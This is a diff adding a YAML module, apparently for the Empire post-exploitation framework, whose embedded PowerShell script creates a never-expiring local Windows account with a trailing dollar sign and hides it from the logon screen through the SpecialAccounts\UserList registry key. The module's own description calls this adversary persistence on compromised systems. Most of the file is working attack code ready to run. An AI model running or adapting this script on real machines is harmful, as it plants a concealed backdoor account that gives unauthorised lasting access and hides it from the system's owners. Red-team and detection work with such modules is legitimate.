@@ -1,0 +1,80 @@
+name: Hidden-User
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Create a local user account and hide it from the Windows logon
+  screen via the SpecialAccounts\UserList registry key. The account
+  is created with a trailing dollar sign to further disguise it.
+  Setting the registry value to 0 for the user prevents it from
+  appearing on the logon screen or in common user enumeration tools.
+  This technique is used by adversaries for persistence while
+  maintaining stealth on compromised systems.
+software: ''
+tactics: [TA0005, TA0003]
+techniques: [T1564.002]
+background: false
+output_extension:
+needs_admin: true
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Username
+    description: >-
+      Username for the hidden account. A dollar sign is appended automatically.
+    required: true
+    value: 'EmpireUser'
+  - name: Password
+    description: Password for the new hidden user account.
+    required: true
+    value: ''
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function New-HiddenUser {
+      param(
+          [string]$Username,
+          [string]$Password
+      )
+
+      $Username = "${Username}`$"
+      $RegPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"
+
+      Write-Output "[*] Creating hidden user account: $Username"
+
+      $netResult = net user $Username $Password /ADD /expires:never 2>&1
+      Write-Output $netResult
+
+      if ($LASTEXITCODE -ne 0) {
+          Write-Output "[-] Failed to create user account."
+          return
+      }
+
+      Write-Output "[*] Hiding user via registry SpecialAccounts\UserList..."
+
+      try {
+          if (-not (Test-Path $RegPath)) {
+              New-Item -Path $RegPath -Force -ErrorAction Stop | Out-Null
+          }
+          New-ItemProperty -Path $RegPath -Name $Username `
+              -Value 0 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
+      } catch {
+          Write-Output "[-] Failed to hide user via registry: $($_.Exception.Message)"
+          Write-Output "[!] WARNING: User account was created but is NOT hidden!"
+          return
+      }
+
+      Write-Output "[+] User $Username created and hidden successfully."
+      Write-Output "[+] Registry key set at: $RegPath"
+      Write-Output "[*] To remove: net user $Username /delete"
+  }
+script_end: New-HiddenUser {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
